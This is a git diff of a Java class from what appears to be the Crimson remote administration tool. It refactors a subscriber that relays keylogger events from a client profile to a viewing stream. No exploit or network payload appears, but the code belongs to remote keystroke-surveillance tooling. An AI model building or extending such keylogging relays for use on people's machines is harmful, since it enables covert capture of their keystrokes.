@@ -15,31 +15,31 @@
  *  limitations under the License.                                            *
  *                                                                            *
  *****************************************************************************/
-package com.subterranean_security.crimson.core.stream.subscriber;
+package com.subterranean_security.crimson.core.net.stream.subscriber;
+
+import java.util.Observable;
+import java.util.Observer;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.net.Connector;
+import com.subterranean_security.crimson.core.net.stream.Stream;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
-import com.subterranean_security.crimson.core.store.ConnectionStore;
-import com.subterranean_security.crimson.core.stream.Stream;
-import com.subterranean_security.crimson.core.stream.StreamStore;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.server.store.ProfileStore;
+import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 
-//TODO DELETE AND MERGE INTO INFO STREAM!!!
-public class SubscriberSlave extends Stream {
+public class SubscriberSlave extends Stream implements Observer {
 
 	private static final Logger log = LoggerFactory.getLogger(SubscriberSlave.class);
 
 	public SubscriberSlave(Param p) {
-		param = p;
+		super(p, p.getVID());
 		start();
 	}
 
@@ -48,25 +48,15 @@ public class SubscriberSlave extends Stream {
 	}
 
 	@Override
-	public void received(Message m) {
-		// do nothing
-	}
-
-	@Override
-	public void send() {
-		// do nothing
-	}
-
-	@Override
 	public void start() {
 
-		if (param.getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ProfileStore.getClient(param.getCID());
+		if (param().getSubscriberParam().getKeylog()) {
+			ClientProfile cp = ProfileStore.getClient(param().getCID());
 
 			if (cp != null) {
-				// cp.getKeylog().addCallback(lcb);
+				cp.getKeylog().addObserver(this);
 			} else {
-				log.warn("ClientProfile: {} was null", param.getCID());
+				stop();
 			}
 		}
 
@@ -74,27 +64,27 @@ public class SubscriberSlave extends Stream {
 
 	@Override
 	public void stop() {
-		if (param.getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ProfileStore.getClient(param.getCID());
+		if (param().getSubscriberParam().getKeylog()) {
+			ClientProfile cp = ProfileStore.getClient(param().getCID());
 
 			if (cp != null) {
-				// cp.getKeylog().removeCallback(lcb);
-			} else {
-				log.warn("ClientProfile: {} was null", param.getCID());
+				cp.getKeylog().deleteObserver(this);
 			}
-
 		}
 	}
 
-	public void trigger(EV_KEvent k) {
-		Connector r = ConnectionStore.get(param.getVID());
-		if (r == null) {
-			// stop this stream
-			StreamStore.removeStreamBySID(getStreamID());
-			return;
+	@Override
+	public void update(Observable arg0, Object arg1) {
+		if (arg0 instanceof Log) {
+			EV_KEvent ev = (EV_KEvent) arg1;
+			write(Message.newBuilder().setEvKevent(ev).setSid(param().getCID()));
 		}
-		r.write(Message.newBuilder().setSid(param.getCID()).setEvKevent(k).build());
 
+	}
+
+	@Override
+	public void received(Message m) {
+		// TODO Auto-generated method stub
 	}
 
 }
